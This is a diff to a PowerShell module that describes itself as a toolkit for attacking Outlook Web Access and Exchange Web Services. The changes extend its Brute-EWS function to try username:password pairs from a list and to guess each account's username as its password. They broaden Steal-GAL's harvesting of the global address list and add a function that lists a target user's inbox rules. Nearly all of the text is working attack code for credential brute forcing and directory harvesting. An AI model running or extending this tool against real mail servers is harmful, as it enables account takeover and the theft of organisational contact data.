@@ -1,5 +1,5 @@
 # Toolkit for attacking OWA
-# author @slobtresix0, @curi0usJack, @glitch1101
+# author @slobtresix0, @curi0usJack, @glitch1101, @porterhau5
 
 #create a conf file and put its path in the send-notification function if you want notifications
 #sample conf format:
@@ -33,10 +33,11 @@ function OTK-Init
 #    good choice.
 #
 #.PARAMETER ExchangeVersion
-#    This is the version of exchange that you are targeting, use one of the other cmdlets to find this or just look at the OWA page.
+#    This is the version of exchange that you are targeting, use one of the other cmdlets to find this or just look
+#    at the OWA page. Use "default" for Outlook.com/Office365.
 #
 #.PARAMETER dllPath
-#    This is used to provide the path to the dll supplied by the Exchange WEb Service installation.
+#    This is used to provide the path to the dll supplied by the Exchange Web Service installation.
 #
 #.PARAMETER ewsPath
 #    Use this parameter to avoid sending a request to the autodiscover method or when autodiscover is unavailable.
@@ -86,6 +87,9 @@ function OTK-Init
 	  [string]$UserMode,
 
       [Parameter(Mandatory=$false)]
+	  [string]$UserPass,
+
+      [Parameter(Mandatory=$false)]
 	  [bool]$Notify
 
 	)
@@ -95,7 +99,24 @@ function OTK-Init
 	{
 	    Try 
 	    {
-	        $dllPath = "C:\Program Files\Microsoft\Exchange\Web Services\2.1\Microsoft.Exchange.WebServices.dll"
+	        if (Test-Path "C:\Program Files\Microsoft\Exchange\Web Services\2.2\Microsoft.Exchange.WebServices.dll")
+            {
+                $dllPath = "C:\Program Files\Microsoft\Exchange\Web Services\2.2\Microsoft.Exchange.WebServices.dll"
+            }
+            elseif (Test-Path "C:\Program Files\Microsoft\Exchange\Web Services\2.1\Microsoft.Exchange.WebServices.dll")
+            {
+                $dllPath = "C:\Program Files\Microsoft\Exchange\Web Services\2.1\Microsoft.Exchange.WebServices.dll"
+            }
+            elseif (Test-Path "C:\Program Files (x86)\Microsoft\Exchange\Web Services\2.1\Microsoft.Exchange.WebServices.dll")
+            {
+                $dllPath = "C:\Program Files (x86)\Microsoft\Exchange\Web Services\2.1\Microsoft.Exchange.WebServices.dll"
+            }
+            else
+            {
+                Write-Warning "You need to install the Exchange Web Service API or check your Microsoft.Exchange.WebServices.dll path"
+                Break
+            }
+
 	        Import-Module -Name $dllPath -ErrorAction Stop
 	    }
 	    Catch 
@@ -109,7 +130,7 @@ function OTK-Init
 	{
 	    Try 
 	    {
-	        Import-Module -Name $dllPath -ErrorAction Stop
+            Import-Module -Name $dllPath -ErrorAction Stop
 	    }
 	    Catch 
 	    {
@@ -138,44 +159,26 @@ function OTK-Init
 	$exchService.UseDefaultCredentials = $false
 
 	#build credential object
-
-	
-
-    if ($UserMode -eq "Yes")
+    if ($Domain.Length -gt 1)
     {
-        
-        if ($Domain.Length -gt 1)
-        {
-
-            $User = $User + "@" + $Domain
-
-        }
-        
-        if ($Password.Length -gt 1)
-        {
-            $creds = New-Object System.Net.NetworkCredential($User,$Password)
-        }
-        else
-        {
-            $Password = $User.Split("@")[0]
-            $creds = New-Object System.Net.NetworkCredential($User,$Password)
-        }
+        $User = $User + "@" + $Domain
     }
-    else
+
+    # -UserPass
+    if ($UserPass.Length -gt 1)
     {
-        if ($Domain.Length -gt 1)
-        {
-
-            $User = $User + "@" + $Domain
-
-        }
-
-        $creds = New-Object System.Net.NetworkCredential($User,$Password)
-
+        $pos = $User.IndexOf(":")
+        $Password = $User.Substring($pos+1)
+        $User = $User.Split(":")[0]
     }
+    # -UserAsPass
+    elseif ($UserMode.Length -gt 1)
+    {
+        $Password = $User.Split("@")[0]
+    }
+
+    $creds = New-Object System.Net.NetworkCredential($User,$Password)
     
-
-
 
     #add to exch service object
 	$exchService.Credentials = $creds
@@ -300,6 +303,7 @@ function Steal-GAL
         [parameter(ParameterSetName="set1")]  [string]$User,
         [parameter(ParameterSetName="set1")]  [string]$ewsPath,
         [parameter(ParameterSetName="set1")]  [string]$Domain,
+        [parameter(ParameterSetName="set1")]  [string]$dllPath,
         [parameter(ParameterSetName="set2", Mandatory=$true,ValueFromPipeline=$true)] [object]$exchService
     )
 
@@ -309,7 +313,7 @@ try
 {
     if ($exchService.Url.length -lt 2)
     {
-        $exchService = OTK-Init -Password $Password -User $User -ExchangeVersion $ExchangeVersion -ewsPath $ewsPath -Domain $Domain
+        $exchService = OTK-Init -Password $Password -User $User -ExchangeVersion $ExchangeVersion -ewsPath $ewsPath -Domain $Domain -dllPath $dllPath
     }
 }
 catch
@@ -334,10 +338,10 @@ foreach ($layer1 in $alphaList)
     {
     continue #everyrequest has SMTP in the response and it messes everything up
     }
-    
+
     try
     {
-        $response = $exchService.ResolveName($layer1)
+        $response = $exchService.ResolveName($layer1,[Microsoft.Exchange.WebServices.Data.ResolveNameSearchLocation]::DirectoryThenContacts,$true)
     }
     catch
     {
@@ -359,7 +363,7 @@ foreach ($layer1 in $alphaList)
 
             try 
             {
-                $response = $exchService.ResolveName($layer2)
+                $response = $exchService.ResolveName($layer2,[Microsoft.Exchange.WebServices.Data.ResolveNameSearchLocation]::DirectoryThenContacts,$true)
             }
             catch
             {
@@ -381,7 +385,7 @@ foreach ($layer1 in $alphaList)
 
                     try
                     {
-                        $response = $exchService.ResolveName($layer3)
+                        $response = $exchService.ResolveName($layer3,[Microsoft.Exchange.WebServices.Data.ResolveNameSearchLocation]::DirectoryThenContacts,$true)
                     }
                     catch
                     {
@@ -456,6 +460,16 @@ function New-GAL
 New-Object PSObject -Property @{
         Name = ''
         Email = ''
+    }
+
+}
+
+function New-Rules 
+{
+
+New-Object PSObject -Property @{
+        Name = ''
+        Id = ''
     }
 
 }
@@ -677,6 +691,9 @@ function Brute-EWS
 #
 #.PARAMETER UserasPass
 #    Self explainatory and sad that it still works :(
+#
+#.PARAMETER UserPass
+#    When this option is set, the TargetList should contain a username and password seperated by a colon (:), one pair per line
 #    
 #.EXAMPLE
 #    Takes a list of userid and adds the domain, then attempted to authenticate with the password param
@@ -715,6 +732,9 @@ function Brute-EWS
 	  [string]$UserAsPass,
 
       [Parameter(Mandatory=$false)]
+	  [string]$UserPass,
+
+      [Parameter(Mandatory=$false)]
 	  [string]$PasswordList,
 
       [Parameter(Mandatory=$false)]
@@ -722,17 +742,12 @@ function Brute-EWS
 
 	)
 
-
-
 $Brute = $True
 $cmdPath = $env:temp + "\OTK-Init.ps1" 
 
 (Get-ChildItem function:OTK-Init).Definition | Out-File -FilePath $cmdPath
 
-
-Multi-Thread -Command $cmdPath -ObjectList (get-content $TargetList) -InputParam "User" -AddParam @{"ExchangeVersion" = $ExchangeVersion ; "Password" = $Password;"ewsPath" = $ewsPath; "Domain" = $Domain; "Brute" = $Brute;"UserMode" = $UserAsPass;} 
-
-
+Multi-Thread -Command $cmdPath -ObjectList (get-content $TargetList) -InputParam "User" -AddParam @{"ExchangeVersion" = $ExchangeVersion ; "Password" = $Password;"ewsPath" = $ewsPath; "Domain" = $Domain; "Brute" = $Brute;"UserMode" = $UserAsPass; "dllPath" = $dllPath; "UserPass" = $UserPass}
 
 }
 
@@ -907,6 +922,105 @@ function Send-Notification
     }
 }
 
+function Display-Rules
+{
+#.Synopsis
+#    Display the user's current mail rules
+#    
+#.Description
+#    This script utilizes the Exchange Web Service API provided by Microsoft to interact with an Exchange Web Service
+#
+#.PARAMETER Password
+#    Password of target user
+#
+#.PARAMETER ExchangeVersion
+#    This is the version of exchange that you are targeting, use one of the other cmdlets to find this or just look
+#    at the OWA page. Use "default" for Outlook.com/Office365.
+#
+#.PARAMETER dllPath
+#    This is used to provide the path to the dll supplied by the Exchange Web Service installation.
+#
+#.PARAMETER ewsPath
+#    Use this parameter to avoid sending a request to the autodiscover method or when autodiscover is unavailable.
+#    
+#.PARAMETER Domain
+#    If set this parameter will append the domain to the user variable.
+#
+#.PARAMETER User
+#    The User to authenticate with against the web service
+#   
+#.EXAMPLE
+#    Display-Rules -Password "littlejohnny" -User "dbetty@outlook.com" -ewsPath "https://outlook.com/EWS/Exchange.asmx" -ExchangeVersion default
+
+	Param
+	(
+
+	  [Parameter(Mandatory=$false)]
+	  [string]$Password,
+
+	  [Parameter(Mandatory=$false)]
+	  [string]$Email,
+	  
+	  [Parameter(Mandatory=$true)]
+	  [string]$ExchangeVersion,
+
+	  [Parameter(Mandatory=$false)]
+	  [string]$dllPath,
+
+	  [Parameter(Mandatory=$false)]
+	  [string]$ewsPath,
+
+	  [Parameter(Mandatory=$false)]
+	  [switch]$CertCheck,
+
+	  [Parameter(Mandatory=$false)]
+	  [string]$User,
+
+	  [Parameter(Mandatory=$false)]
+	  [string]$Domain,
+
+      [Parameter(Mandatory=$false)]
+	  [string]$Brute,
+
+      [Parameter(Mandatory=$false)]
+	  [string]$UserMode,
+
+      [Parameter(Mandatory=$false)]
+	  [bool]$Notify
+
+	)
+
+$Rules = @()
+
+#setup exchService if not passed from pipeline
+try
+{
+    if ($exchService.Url.length -lt 2)
+    {
+        $exchService = OTK-Init -Password $Password -User $User -ExchangeVersion $ExchangeVersion -ewsPath $ewsPath -Domain $Domain -dllPath $dllPath
+    }
+}
+catch
+{
+    $ErrorMessage = $_.Exception.Message
+}
+
+$inboxRules = $exchService.GetInboxRules()
+
+Write-Host "Rules: "
+foreach ($rule in $inboxRules)
+{
+    Write-Host "  Name: " $rule.DisplayName ", Id: " $rule.Id
+    $tmpRule = New-Rules
+    $tmpRule.Name = $rule.DisplayName
+    $tmpRule.Id = $rule.Id
+    $Rules += $tmpRule
+}
+
+return $Rules
+
+}
+
 Export-ModuleMember OTK-Init
 Export-ModuleMember Get-ewsPath
 Export-ModuleMember Get-owaPath
@@ -920,3 +1034,4 @@ Export-ModuleMember Scan-MAPI
 Export-ModuleMember Scan-EWS
 Export-ModuleMember Send-Notification
 Export-ModuleMember Failure
+Export-ModuleMember Display-Rules
